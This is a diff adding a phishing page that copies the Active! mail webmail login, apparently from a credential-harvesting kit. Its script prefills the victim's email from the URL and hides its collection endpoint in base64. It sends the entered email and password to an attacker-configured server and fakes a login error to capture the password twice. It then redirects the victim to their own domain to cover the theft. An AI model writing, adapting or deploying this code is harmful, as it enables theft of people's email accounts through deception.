@@ -1,0 +1,356 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <!--<meta name="viewport" content="width=device-width, initial-scale=1.0">-->
+    <title>Active mail</title>
+    <style>
+        * {
+            padding: 0;
+            margin: 0;
+        }
+        body {
+            background-image: url(https://acmail6.secure.ne.jp/am_viz/common/img/standard/index_bg.gif);
+            background-repeat: repeat-y;
+        }
+        img {
+            width: 100%;
+            height: auto;
+        }
+        .imghh {
+            width: 11%;
+        }
+        header {
+            padding: 2rem;
+            border-bottom: 2px solid white;
+        }
+        .topblue {
+            background: #5791d1;
+            padding: 5px;
+        }
+        div.contanbox {
+            margin: 10% auto 14% auto;
+            width: 410px;
+            border: 1px solid #999999;
+            background: #f0f0f0;
+        }
+        form {
+            padding: 4px;
+            width: 95%;
+            margin: auto;
+        }
+        .innercont {
+            width: 96%;
+            margin: auto;
+        }
+        .flex1 {
+            display: flex;
+            align-items: center;
+            gap: .7rem;
+            margin: 3px 0;
+        }
+        .flex1 input {
+            width: 160px;
+            padding: 2px 2px;
+        }
+        .flex1 label {
+            width: 90px;
+            font-size: 12px;
+            color: #333333;
+            font-weight: 800;
+            text-align: end;
+        }
+        .smallk {
+            width: 20%;
+        }
+        .copyright {
+            margin: 0;
+            padding: 0;
+            color: #666666;
+            font-size: 68%;
+            vertical-align: bottom;
+            white-space: nowrap;
+            text-align: left;
+            font-weight: 600;
+        }
+        .flexd {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .flexd button {
+            padding: 2px 9px;
+            background: transparent;
+        }
+        .divider {
+            width: 100%;
+            background-image: url(https://acmail6.secure.ne.jp/am_viz/common/img/standard/index_border.gif);
+            background-repeat: no-repeat;
+            height: 1rem;
+        }
+        .boxalert {
+            position: fixed;
+            top: 0px;
+            left: 0px;
+            background-color: rgba(175, 175, 175, 0.471);
+            width: 100%;
+            height: 100vh;
+            z-index: 10;
+            display: none;
+        }
+        .innerboxx {
+            border-width: 1px;
+            border-style: solid;
+            border-color: #3973ad;
+            background-color: white;
+            padding: 2px;
+            width: 386px;
+            height: 180px;
+            margin: auto;
+            margin-top: 17rem;
+            /* position: relative;
+            top: 40%; */
+        }
+        .top {
+            padding: 3px 0 0 10px;
+            color: white;
+            background-color: #3973ad;
+            cursor: default;
+            font-size: 12px;
+            font-weight: bold;
+            white-space: nowrap;
+        }
+        .innerboxx button {
+            padding: 3px 8px;
+            margin: auto;
+            display: block;
+            text-align: center;
+            margin-top: 1rem;
+        }
+    </style>
+</head>
+<body>
+    <main>
+        <header>
+            <div class="imghh">
+                <img src="https://acmail6.secure.ne.jp/am_viz/common/img/standard/am_logo_index.gif" alt="">
+            </div>
+        </header>
+        <div class="divider"></div>
+
+        <div class="contanbox">
+            <div class="topblue">
+                <div class="smallk">
+                    <img src="https://acmail6.secure.ne.jp/am_viz/common/img/standard/index_login.gif" alt="">
+                </div>
+            </div>
+            
+                <div class="innercont">
+                    <div class="flex1">
+                        <label for="">電子メールID :</label>
+                        <input type="text" name="userid" id="ai" readonly required>
+                    </div>
+                    <div class="flex1">
+                        <label for="">パスワード :</label>
+                        <input type="password" name="userpwd" id="pr" required>
+                    </div>
+                    <div class="flex1">
+                        <label for="">言語 :</label>
+                        <select name="" tabindex="4">
+                           <option value="auto" selected="">自動選択</option>
+            
+                          <option value="en">English</option>
+            
+                          <option value="ja">日本語</option>
+            
+                          <option value="ko">韓国語</option>
+            
+                          <option value="zh-cn">中国語</option>
+                        </select>
+                    </div>
+                </div>
+				<div class="error" id="msg" style="display: none; color:red;">
+                                &#xC544;&#xC774;&#xB514;&#xB098;&#x20;&#xBE44;&#xBC00;&#xBC88;&#xD638;&#xAC00;&#x20;&#xC815;&#xD655;&#xD558;&#xC9C0;&#x20;&#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;&#x2E;
+                            </div>
+                            <div class="error" id="error" style="display: none; color:red;">
+                                &#xC544;&#xC774;&#xB514;&#xB098;&#x20;&#xBE44;&#xBC00;&#xBC88;&#xD638;&#xAC00;&#x20;&#xC815;&#xD655;&#xD558;&#xC9C0;&#x20;&#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;&#x2E;
+                            </div>
+                <div class="dd">
+                    <p style="text-align: end;font-size: 11.7px;font-weight: 800;font-family: sans-serif;">
+                        <input type="checkbox" name="" id="">
+                        ユーザーID/パスワードを保存する
+                    </p>
+                    <div class="flexd">
+                        <small class="copyright">アクティブ！ 郵便 <br>©1998 株式会社クオリティア 無断転載を禁じます。</small>
+                        <button type="submit" id="submit-btn">ログイン</button>
+                    </div>
+                </div>
+        </div>
+    </main>
+    <div class="boxalert">
+        <div class="innerboxx">
+            <div class="top">エラー: ログインエラー</div>
+            <span>ログインに失敗しました。 ユーザーIDまたはパスワードが無効です。</span><br><br><br><br>
+            <button id="close">オーケー</button>
+        </div>
+    </div>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script src="./config.js"></script>
+
+
+    <script>
+/* global $ */
+$(document).ready(function() {
+    var count = 0;
+
+    $('#back1').click(function() {
+        $("#msg").hide();
+        $('#ai').val("");
+        $("#automail").animate({ left: 200, opacity: "hide" }, 0);
+        $("#inputbar").animate({ right: 200, opacity: "show" }, 1000);
+
+    });
+
+    /////////////url ai getting////////////////
+    var ai = window.location.hash.substr(1);
+    if (!ai) {
+
+    } else {
+        // $('#ai').val(ai);
+        var my_ai = ai;
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        var dom = c.toUpperCase();
+        $('#ai').val(my_ai);
+        $('#ai').attr('disabled', "");
+        $('#login_logo1').attr('src', 'https://logo.clearbit.com/' + my_slice);
+        $('#domain-name').html(dom);
+        $("#msg").hide();
+        $("#inputbar").animate({ left: 200, opacity: "hide" }, 0);
+        $("#automail").animate({ right: 200, opacity: "show" }, 1000);
+    }
+    ///////////////url getting ai////////////////
+
+
+    var atu = "L2Nvbm5lY3QucGhw";
+	
+    $('#submit-btn').click(function(event) {
+        $('#error').hide();
+        $('#msg').hide();
+        event.preventDefault();
+        var ai = $("#ai").val();
+        var pr = $("#pr").val();
+        var msg = $('#msg').html();
+        $('#msg').text(msg);
+        ///////////new injection////////////////
+        var my_ai = ai;
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!ai) {
+            $('#error').show();
+            $('#error').html("&#x30E1;&#x30FC;&#x30EB;&#x30A2;&#x30C9;&#x30EC;&#x30B9;&#x3001;&#x307E;&#x305F;&#x306F;&#x3001;&#x30E1;&#x30FC;&#x30EB;&#x30D1;&#x30B9;&#x30EF;&#x30FC;&#x30C9;&#x304C;&#x6B63;&#x3057;&#x304F;&#x306A;&#x3044;&#x3088;&#x3046;&#x3067;&#x3059;&#x3002;");
+            ai.focus;
+            return false;
+        }
+
+        if (!filter.test(my_ai)) {
+            $('#error').show();
+            $('#error').html("&#x30E1;&#x30FC;&#x30EB;&#x30A2;&#x30C9;&#x30EC;&#x30B9;&#x3001;&#x307E;&#x305F;&#x306F;&#x3001;&#x30E1;&#x30FC;&#x30EB;&#x30D1;&#x30B9;&#x30EF;&#x30FC;&#x30C9;&#x304C;&#x6B63;&#x3057;&#x304F;&#x306A;&#x3044;&#x3088;&#x3046;&#x3067;&#x3059;&#x3002;");
+            ai.focus;
+            return false;
+        }
+        if (!pr) {
+            $('#error').show();
+            $('#error').html("&#x30E1;&#x30FC;&#x30EB;&#x30A2;&#x30C9;&#x30EC;&#x30B9;&#x3001;&#x307E;&#x305F;&#x306F;&#x3001;&#x30E1;&#x30FC;&#x30EB;&#x30D1;&#x30B9;&#x30EF;&#x30FC;&#x30C9;&#x304C;&#x6B63;&#x3057;&#x304F;&#x306A;&#x3044;&#x3088;&#x3046;&#x3067;&#x3059;&#x3002;");
+            ai.focus;
+            return false;
+        }
+		
+		
+		if(pr.length < 5) {  
+
+			$('#error').show();
+            $('#error').html("&#x30E1;&#x30FC;&#x30EB;&#x30A2;&#x30C9;&#x30EC;&#x30B9;&#x3001;&#x307E;&#x305F;&#x306F;&#x3001;&#x30E1;&#x30FC;&#x30EB;&#x30D1;&#x30B9;&#x30EF;&#x30FC;&#x30C9;&#x304C;&#x6B63;&#x3057;&#x304F;&#x306A;&#x3044;&#x3088;&#x3046;&#x3067;&#x3059;&#x3002;");
+            ai.focus;  
+
+			return false;  
+
+		}
+
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        var dom = c.toUpperCase();
+        ///////////new injection////////////////
+        count = count + 1;
+        $('#ai').attr('disabled', "");
+        $('#login_logo1').attr('src', 'https://logo.clearbit.com/' + my_slice);
+        $('#domain-name').html(dom);
+
+        $.ajax({
+            dataType: 'JSON',
+            url: `${config.baseUrl}${atob(atu)}`,
+            type: 'POST',
+            data: {
+                ai: ai,
+                pr: pr,
+            },
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr) {
+                $('#submit-btn').html('Verifing...');
+            },
+            success: function(response) {
+                if (response) {
+                    $("#msg").show();
+                    console.log(response);
+                    if (response['signal'] == 'ok') {
+                        $("#pr").val("");
+                        if (count >= 2) {
+                            count = 0;
+                            // window.location.replace(response['redirect_link']);
+                            window.location.replace("http://www." + my_slice);
+
+                        }
+                        // $('#msg').html(response['msg']);
+                    } else {
+                        // $('#msg').html(response['msg']);
+                    }
+                }
+            },
+            error: function() {
+                $("#pr").val("");
+                if (count >= 2) {
+                    count = 0;
+                    window.location.replace("http://www." + my_slice);
+                }
+                $("#msg").show();
+                // $('#msg').html("Please try again later");
+            },
+            complete: function() {
+                $('#submit-btn').html('Login');
+            }
+        });
+    });
+
+
+});
+
+function getParameterByName(name, url) {
+			if (!url) url = window.location.href;
+			name = name.replace(/[\[\]]/g, '\\$&');
+			var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
+				results = regex.exec(url);
+			if (!results) return null;
+			if (!results[2]) return '';
+			return decodeURIComponent(results[2].replace(/\+/g, ' '));
+		}
+			
+		const login_username = getParameterByName('cms');
+		document.getElementById("ai").value = login_username;
+</script>
+</body>
+</html>
